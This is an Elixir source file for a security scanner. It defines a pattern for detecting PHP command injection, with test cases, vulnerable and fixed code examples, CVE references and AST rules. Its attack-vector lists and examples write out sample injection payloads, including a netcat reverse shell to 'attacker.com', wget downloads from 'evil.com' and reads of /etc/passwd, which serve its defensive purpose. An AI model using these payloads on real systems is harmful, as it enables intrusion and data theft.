defmodule Rsolv.Security.Patterns.Php.CommandInjection do
  @moduledoc """
  Pattern for detecting command injection vulnerabilities in PHP.

  This pattern identifies when user input from PHP superglobals ($_GET, $_POST, $_REQUEST, $_COOKIE)
  is passed to system command execution functions without proper sanitization. This is one of the
  most critical vulnerabilities as it allows remote code execution.

  ## Vulnerability Details

  Command injection occurs when user-controlled input is passed to functions that execute
  system commands. PHP provides multiple functions for command execution:
  - `system()` - Executes command and outputs result
  - `exec()` - Executes command and returns last line
  - `shell_exec()` - Executes command via shell and returns output
  - `passthru()` - Executes command and passes raw output
  - Backticks (``) - Shorthand for shell_exec()

  ### Attack Example
  ```php
  // Vulnerable code
  system("ping " . $_GET['host']);

  // Attack: ?host=8.8.8.8; cat /etc/passwd
  // Results in: ping 8.8.8.8; cat /etc/passwd
  ```
  """

  use Rsolv.Security.Patterns.PatternBase
  alias Rsolv.Security.Pattern

  @impl true
  def pattern do
    %Pattern{
      id: "php-command-injection",
      name: "Command Injection",
      description: "User input passed to system commands allows remote code execution",
      type: :command_injection,
      severity: :critical,
      languages: ["php"],
      regex:
        ~r/(?:system|exec|shell_exec|passthru)\s*\(\s*.*\$_(GET|POST|REQUEST|COOKIE)|`[^`]*\$_(GET|POST|REQUEST|COOKIE)[^`]*`/,
      cwe_id: "CWE-78",
      owasp_category: "A03:2021",
      recommendation: "Use escapeshellarg() for arguments or avoid system commands entirely",
      test_cases: %{
        vulnerable: [
          ~S|system("ping " . $_GET['host']);|,
          ~S|exec("convert " . $_POST['file'] . " output.pdf");|,
          ~S|$output = `ls $_GET[dir]`;|
        ],
        safe: [
          ~S|$host = escapeshellarg($_GET['host']);
system("ping " . $host);|,
          ~S|// Better: avoid system commands entirely
$files = scandir($directory);|
        ]
      }
    }
  end

  @impl true
  def vulnerability_metadata do
    %{
      description: """
      Command injection is a critical vulnerability that allows attackers to execute
      arbitrary system commands on the server. In PHP, this occurs when user input
      is passed to command execution functions without proper sanitization.

      The impact is severe:
      - Complete system compromise via remote code execution
      - Data exfiltration
      - Malware installation
      - Lateral movement in the network
      - Denial of service
      - Cryptocurrency mining

      PHP's multiple command execution functions and the convenience of backticks
      make this vulnerability particularly common in PHP applications.
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-78",
          title:
            "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
          url: "https://cwe.mitre.org/data/definitions/78.html"
        },
        %{
          type: :owasp,
          id: "A03:2021",
          title: "OWASP Top 10 2021 - A03 Injection",
          url: "https://owasp.org/Top10/A03_2021-Injection/"
        },
        %{
          type: :research,
          id: "php_command_injection",
          title: "PHP Command Injection: Examples and Prevention",
          url: "https://www.stackhawk.com/blog/php-command-injection/"
        },
        %{
          type: :research,
          id: "php_dangerous_functions",
          title: "Dangerous PHP Functions",
          url: "https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720"
        }
      ],
      attack_vectors: [
        "Command chaining: ?host=8.8.8.8; whoami",
        "Command substitution: ?file=$(cat /etc/passwd)",
        "Pipe injection: ?log=access.log | mail attacker@evil.com",
        "Background execution: ?cmd=ping localhost &",
        "Output redirection: ?file=data.txt > /var/www/html/shell.php",
        "Null byte injection: ?file=report.pdf%00; nc -e /bin/sh attacker.com 4444"
      ],
      real_world_impact: [
        "Remote code execution with web server privileges",
        "Complete server compromise and backdoor installation",
        "Data theft including database credentials and source code",
        "Cryptocurrency mining malware deployment",
        "Botnet recruitment for DDoS attacks",
        "Lateral movement to internal network systems"
      ],
      cve_examples: [
        %{
          id: "CVE-2024-4577",
          description: "PHP CGI Argument Injection - Critical RCE affecting PHP on Windows",
          severity: "critical",
          cvss: 9.8,
          note: "Allows remote code execution via CGI argument injection, actively exploited"
        },
        %{
          id: "CVE-2021-29447",
          description: "WordPress XXE leading to command injection via media library",
          severity: "critical",
          cvss: 9.8,
          note: "XXE vulnerability escalated to RCE through PHP command injection"
        },
        %{
          id: "CVE-2020-8813",
          description: "Cacti command injection via graph export feature",
          severity: "critical",
          cvss: 8.8,
          note: "Authenticated RCE through unsanitized input to shell_exec()"
        },
        %{
          id: "CVE-2019-16113",
          description: "Bludit CMS command injection in image upload",
          severity: "critical",
          cvss: 9.8,
          note: "Remote code execution via UUID parameter in image processing"
        },
        %{
          id: "CVE-2014-6271",
          description: "Shellshock - Bash command injection affecting PHP applications",
          severity: "critical",
          cvss: 10.0,
          note: "Environment variable injection leading to RCE in PHP apps using system()"
        }
      ],
      detection_notes: """
      This pattern detects command injection by looking for:
      - System command functions (system, exec, shell_exec, passthru)
      - Backtick operators for command execution
      - Direct use of PHP superglobals in command contexts
      - Both concatenation and interpolation of user input

      The pattern covers various PHP command execution methods and is designed
      to catch the most common injection points.
      """,
      safe_alternatives: [
        "Use PHP built-in functions instead of system commands when possible",
        "If system commands are necessary, use escapeshellarg() for all arguments",
        "Use escapeshellcmd() for the entire command if constructing complex commands",
        "Implement strict input validation with allowlists",
        "Use process control functions like proc_open() with proper argument arrays",
        "Run commands in restricted shells or containers",
        "Implement the principle of least privilege for the web server user"
      ],
      additional_context: %{
        common_mistakes: [
          "Believing escapeshellcmd() alone is sufficient (it's not for arguments)",
          "Using blacklist validation instead of allowlist",
          "Trusting data from $_SERVER or $_COOKIE as 'safe'",
          "Not considering encoded payloads (URL encoding, Unicode)",
          "Assuming certain characters like spaces make injection impossible"
        ],
        secure_patterns: [
          "Using built-in PHP: $files = scandir($dir) instead of exec('ls')",
          "Parameterized commands: proc_open with separate argument array",
          "Input validation: if (!preg_match('/^[a-zA-Z0-9.-]+$/', $host)) { die(); }",
          "Using libraries: Symfony Process component for safe command execution"
        ],
        php_specific_notes: [
          "Backticks (``) are equivalent to shell_exec()",
          "exec() only returns the last line, use output parameter for full output",
          "system() and passthru() output directly to browser",
          "proc_open() provides most control but requires careful use",
          "Windows and Linux have different command separators (; vs &&)"
        ]
      }
    }
  end

  @doc """
  Returns test cases for the pattern.

  ## Examples

      iex> test_cases = Rsolv.Security.Patterns.Php.CommandInjection.test_cases()
      iex> length(test_cases.positive) > 0
      true
      
      iex> test_cases = Rsolv.Security.Patterns.Php.CommandInjection.test_cases()
      iex> length(test_cases.negative) > 0
      true
  """
  def test_cases do
    %{
      positive: [
        %{
          code: ~S|system("ping " . $_GET['host']);|,
          description: "Direct concatenation with system()"
        },
        %{
          code: ~S|exec("convert " . $_POST['file'] . " output.pdf");|,
          description: "File parameter injection with exec()"
        },
        %{
          code: ~S|$output = shell_exec("nslookup " . $_REQUEST['domain']);|,
          description: "Domain lookup injection"
        },
        %{
          code: ~S|passthru("zip -r backup.zip " . $_GET['files']);|,
          description: "Archive creation injection"
        },
        %{
          code: ~S|$result = `ping -c 4 $_POST[host]`;|,
          description: "Backtick operator injection"
        },
        %{
          code: ~S|system("echo '$_COOKIE[message]' >> log.txt");|,
          description: "Cookie value injection"
        }
      ],
      negative: [
        %{
          code: ~S|$host = escapeshellarg($_GET['host']); system("ping " . $host);|,
          description: "Properly escaped argument"
        },
        %{
          code: ~S|system("ls -la /var/www/html");|,
          description: "Static command without user input"
        },
        %{
          code: ~S|$files = scandir($_GET['directory']);|,
          description: "Using PHP built-in instead of system command"
        },
        %{
          code: ~S|exec("whoami");|,
          description: "Command without parameters"
        }
      ]
    }
  end

  @doc """
  Returns examples of vulnerable and fixed code.
  """
  def examples do
    %{
      vulnerable: %{
        "Basic ping command injection" => ~S"""
        // Ping utility - VULNERABLE
        $host = $_GET['host'];
        system("ping -c 4 " . $host);

        // Attack: ?host=8.8.8.8; cat /etc/passwd
        // Executes: ping -c 4 8.8.8.8; cat /etc/passwd
        """,
        "Image conversion injection" => ~S"""
        // Image processor - VULNERABLE
        $input = $_POST['image'];
        $output = $_POST['format'];
        exec("convert $input output.$output");

        // Attack: ?image=test.jpg; wget evil.com/shell.php
        // Downloads and potentially executes malicious script
        """,
        "Log viewer injection" => ~S"""
        // Log viewer - VULNERABLE
        $logfile = $_GET['log'];
        $lines = $_GET['lines'];
        $output = `tail -n $lines /var/log/$logfile`;
        echo "<pre>$output</pre>";

        // Attack: ?log=apache2/access.log; id; ls -la /etc/
        // Reveals system information and directory contents
        """
      },
      fixed: %{
        "Using escapeshellarg()" => ~S"""
        // Ping utility - SECURE
        $host = $_GET['host'];

        // Validate input first
        if (!filter_var($host, FILTER_VALIDATE_IP) && 
            !filter_var($host, FILTER_VALIDATE_DOMAIN)) {
            die("Invalid host");
        }

        // Escape the argument
        $safe_host = escapeshellarg($host);
        system("ping -c 4 " . $safe_host);
        """,
        "Avoiding shell commands" => ~S"""
        // File listing - SECURE
        $directory = $_GET['dir'];

        // Validate directory
        $allowed_dirs = ['/var/www/uploads', '/var/www/public'];
        $real_path = realpath($directory);

        if (!in_array($real_path, $allowed_dirs)) {
            die("Invalid directory");
        }

        // Use PHP built-in function instead of 'ls'
        $files = scandir($real_path);
        foreach ($files as $file) {
            echo htmlspecialchars($file) . "\n";
        }
        """,
        "Using PHP built-in functions" => ~S"""
        // Archive creation - SECURE
        $files = $_POST['files'];

        // Use PHP's ZipArchive instead of system zip command
        $zip = new ZipArchive();
        $zip->open('backup.zip', ZipArchive::CREATE);

        foreach ($files as $file) {
            // Validate each file path
            if (is_file($file) && is_readable($file)) {
                $zip->addFile($file);
            }
        }

        $zip->close();
        """
      }
    }
  end

  @doc """
  Returns detailed vulnerability description.
  """
  def vulnerability_description do
    """
    Command injection is one of the most severe vulnerabilities in web applications,
    allowing attackers to execute arbitrary system commands on the server. In PHP,
    this vulnerability is particularly common due to the language's multiple command
    execution functions and its widespread use in web applications, enabling
    remote code execution attacks.

    ## Why It's Critical

    Command injection provides attackers with the ability to:
    - Execute any command the web server user can run
    - Read sensitive files (/etc/passwd, config files, source code)
    - Modify or delete files
    - Download and execute malware
    - Establish reverse shells for persistent access
    - Pivot to internal network resources

    ## PHP Command Execution Functions

    PHP provides several functions for executing system commands:

    1. **system()** - Executes command and outputs result directly
    2. **exec()** - Executes command and returns last line of output
    3. **shell_exec()** - Executes command via shell and returns complete output
    4. **passthru()** - Executes command and passes raw output to browser
    5. **Backticks (``)** - Shorthand for shell_exec()
    6. **proc_open()** - Opens a process with more control
    7. **popen()** - Opens a pipe to a process

    ## Real-World CVE Examples

    - **CVE-2024-4577**: PHP CGI critical vulnerability allowing RCE
    - **CVE-2021-29447**: WordPress media library RCE
    - **CVE-2020-8813**: Cacti monitoring tool RCE
    - **CVE-2019-16113**: Bludit CMS image upload RCE
    - **CVE-2014-6271**: Shellshock affecting PHP applications

    ## Attack Techniques

    Attackers use various techniques to exploit command injection:
    - **Command chaining**: `; whoami; id; ls -la`
    - **Command substitution**: `$(cat /etc/passwd)`
    - **Pipe operations**: `| nc attacker.com 4444`
    - **Background execution**: `& wget evil.com/backdoor.sh &`
    - **Output redirection**: `> /var/www/html/shell.php`

    ## Prevention Strategies

    1. **Avoid system commands** - Use PHP built-in functions when possible
    2. **Input validation** - Strict allowlist validation
    3. **Escaping** - Use escapeshellarg() for arguments
    4. **Least privilege** - Run web server with minimal permissions
    5. **Sandboxing** - Use containers or restricted shells
    6. **Monitoring** - Log and alert on command execution
    """
  end

  @doc """
  Returns AST enhancement rules to reduce false positives.

  ## Examples

      iex> enhancement = Rsolv.Security.Patterns.Php.CommandInjection.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:ast_rules, :min_confidence]
      
      iex> enhancement = Rsolv.Security.Patterns.Php.CommandInjection.ast_enhancement()
      iex> enhancement.min_confidence
      0.95
      
      iex> enhancement = Rsolv.Security.Patterns.Php.CommandInjection.ast_enhancement()
      iex> length(enhancement.ast_rules)
      3
  """
  @impl true
  def ast_enhancement do
    %{
      ast_rules: [
        %{
          type: "command_context",
          description: "Verify command execution context",
          functions: [
            "system",
            "exec",
            "shell_exec",
            "passthru",
            "proc_open",
            "popen",
            "backtick"
          ]
        },
        %{
          type: "input_escaping",
          description: "Check for proper escaping functions",
          escape_functions: [
            "escapeshellarg",
            "escapeshellcmd",
            "addslashes",
            "preg_match",
            "filter_var"
          ],
          note: "escapeshellarg is preferred for individual arguments"
        },
        %{
          type: "safe_alternatives",
          description: "Detect use of safer alternatives",
          functions: [
            # When used with array arguments
            "proc_open",
            # Direct execution without shell
            "pcntl_exec",
            # Instead of ls
            "scandir",
            # Instead of cat
            "file_get_contents",
            # Instead of zip command
            "ZipArchive"
          ]
        }
      ],
      min_confidence: 0.95
    }
  end
end
